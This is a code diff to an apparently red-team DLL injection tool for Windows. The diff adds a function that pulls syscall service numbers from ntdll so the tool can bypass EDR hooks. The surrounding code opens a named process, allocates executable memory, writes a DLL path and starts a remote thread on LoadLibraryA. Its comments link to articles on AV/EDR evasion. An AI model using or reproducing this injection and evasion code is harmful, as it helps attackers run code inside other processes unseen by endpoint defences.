@@ -26,9 +26,12 @@ extern "C" {
  * https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/
  * https://signal-labs.com/analysis-of-edr-hooks-bypasses-amp-our-rust-sample/
  * https://codemachine.com/articles/system_call_instructions.html 
+ * https://redops.at/en/blog/direct-syscalls-vs-indirect-syscalls 
  * https://github.com/lsecqt / https://www.youtube.com/@Lsecqt 
- * https://alice.climent-pommeret.red/
  * https://github.com/cr-0w
+ * https://alice.climent-pommeret.red/
+ * https://blog.maikxchd.com/evading-edrs-by-unhooking-ntdll-in-memory
+
 */
 
 #define MAX_DLL_PATH 255
@@ -37,14 +40,6 @@ extern "C" {
 int main(int argc, char *argv[]) {
     int res = openProcAndExec(argv[1], argv[2]); // [1] is dll path, [2] e.g. notepad.exe
 }
-
-
-void logError(const char* message) {
-    if (ERROR_LOGGING_ENABLED) {
-        std::cerr << "Error: " << message << std::endl;
-    }
-}
-
 
 /**
  * @brief Retrieves a handle to a process by its name.
@@ -76,7 +71,7 @@ HANDLE getHandleToProcessByName(const char* processName) {
     // snapshot of all processes in the system
     snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (snapshot == INVALID_HANDLE_VALUE) {
-        logError("Failed to create process snapshot");
+        printError("Failed to create process snapshot");
         return 0; // return 0 if snapshot creation fails
     }
 
@@ -102,7 +97,7 @@ HANDLE getHandleToProcessByName(const char* processName) {
     }
 
     NtClose(snapshot); // close the snapshot handle if process not found
-    logError("Target process not found");
+    printError("Target process not found");
     return NULL; // return 0 if process not found
 }
 
@@ -122,19 +117,24 @@ HANDLE getHandleToProcessByName(const char* processName) {
  */
 int openProcAndExec(const char *pathToDLL, const char *processToInj) {
 
+    // define the SSN of the NTAPI call chain we are bypassing
+    // note the variables to store the SSN are declared in kernel_abstract.h
+    HMODULE hNTDLL = getModule(L"NTDLL");
+    wNtOpenProcess = getSSN(hNTDLL, "NtOpenProcess");
+
     OBJECT_ATTRIBUTES OA = { sizeof(OA), 0 };
     NTSTATUS status = 0x0;
     PVOID alloc = NULL;
 
     // validate input params 
     if (pathToDLL == NULL || processToInj == NULL) {
-        logError("Invalid usage: inj.exe 'path_to_all.dll' 'process_to_inject_into.exe'. Quitting...");
+        printError("Invalid usage: inj.exe 'path_to_all.dll' 'process_to_inject_into.exe'. Quitting...");
         return -1; // return error if input params are null
     }
 
     char dllPathToInject[MAX_DLL_PATH];
     if (strlen(pathToDLL) >= sizeof(dllPathToInject)) {
-        logError("DLL path length exceeds buffer size");
+        printError("DLL path length exceeds buffer size");
         return -1;
     }
     
@@ -152,18 +152,19 @@ int openProcAndExec(const char *pathToDLL, const char *processToInj) {
     // get handle to the Kernel32.dll and the address of LoadLibraryA
     HMODULE hK32 = getModule(L"Kernel32");
     if (!hK32) {
-        logError("Failed to get handle to Kernel32.dll");
+        printError("Failed to get handle to Kernel32.dll");
         return -1;
     }
     
     // get modules
     PTHREAD_START_ROUTINE loadlib = (PTHREAD_START_ROUTINE)GetProcAddress(hK32, "LoadLibraryA");
 
+
     // allocate memory in the target process for the DLL path
     status = NtAllocateVirtualMemory(hProcess, &alloc, 0, &dllPathLength, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
     if (status != 0x0) {
         NtClose(hProcess);
-        logError("Failed to allocate memory in target process");
+        printError("Failed to allocate memory in target process");
         return -1; // return error if memory allocation fails
     }
 
@@ -172,7 +173,7 @@ int openProcAndExec(const char *pathToDLL, const char *processToInj) {
     if (status != 0x0) {
         VirtualFreeEx(hProcess, alloc, 0, MEM_RELEASE);
         NtClose(hProcess);
-        logError("Failed to write DLL path to process memory");
+        printError("Failed to write DLL path to process memory");
         return -1; // return error if writing to process memory fails
     }
 
@@ -190,7 +191,7 @@ int openProcAndExec(const char *pathToDLL, const char *processToInj) {
 
         char errorMessage[256];
         sprintf(errorMessage, "Failed to create remote thread, error: 0x%lx", status);
-        logError(errorMessage);
+        printError(errorMessage);
 
         return -1; // return error if thread creation fails
     }
@@ -206,6 +207,21 @@ int openProcAndExec(const char *pathToDLL, const char *processToInj) {
     return 0;
 }
 
+/**
+ * Some logging functions.
+*/
+void logPrintLn(const char* printType, const char* message) {
+    if (ERROR_LOGGING_ENABLED) {
+        std::cerr << printType << message << std::endl;
+    }
+}
+void printInfo(const char* message) {
+    logPrintLn("[i] Info: ", message);
+}
+
+void printError(const char* message) {
+    logPrintLn("[-] Error: ", message);
+}
 
 /**
  * @brief Finds system module for given module name
@@ -217,7 +233,7 @@ int openProcAndExec(const char *pathToDLL, const char *processToInj) {
 */
 HMODULE getModule(LPCWSTR moduleName) {
     if (moduleName == nullptr) {
-        logError("Null module name provided to getModule");
+        printError("Null module name provided to getModule");
         return nullptr;
     }
 
@@ -244,13 +260,47 @@ HMODULE getModule(LPCWSTR moduleName) {
         char combinedMessage[512];
         snprintf(combinedMessage, 512, "Failed to load module %s: %s", moduleNameNarrow, (char*)lpMsgBuf);
 
-        logError(combinedMessage);
+        printError(combinedMessage);
         LocalFree(lpMsgBuf);
 
         return nullptr;
     }
 
     return hModule;
+}
+
+
+/**
+ * @brief Retrieves the System Service Number (SSN) of a specified NT function.
+ *
+ * Obtain the SSN of a given NT function within the Windows NTAPI. We attempt to locate 
+ * the address of the specified function using GetProcAddress
+ * If successful, we calculate the SSN by accessing the specific offset in the function's
+ * memory address.
+ * 
+ * Inspired by the legend https://github.com/cr-0w
+ *
+ * @param dllModule A handle to the loaded NT DLL module (ntdll.dll)
+ * @param NtFunction A string specifying the name of the NT function to retrieve the SSN for
+ * @return DWORD Returns the SSN of the specified function. Returns 0 if the function's address
+ *               cannot be found or if an error occurs during retrieval
+ */
+DWORD getSSN(IN HMODULE dllModule, IN LPCSTR NtFunction) {
+    char logBuffer[256]; // buffer for formatted log messages
+
+    FARPROC NtFunctionAddress = GetProcAddress(dllModule, NtFunction);
+
+    if (NtFunctionAddress == NULL) {
+        sprintf(logBuffer, "Failed to get the address of %s", NtFunction);
+        printError(logBuffer);
+        return 0; // Return 0 instead of NULL for DWORD
+    }
+
+    DWORD NtFunctionSSN = *((PDWORD)((PBYTE)NtFunctionAddress + 4));
+
+    sprintf(logBuffer, "SSN of %s: 0x%lx (Address: 0x%p+0x4)", NtFunction, NtFunctionSSN, (void*)NtFunctionAddress);
+    printInfo(logBuffer);
+    return NtFunctionSSN;
 }
 
 #ifdef __cplusplus
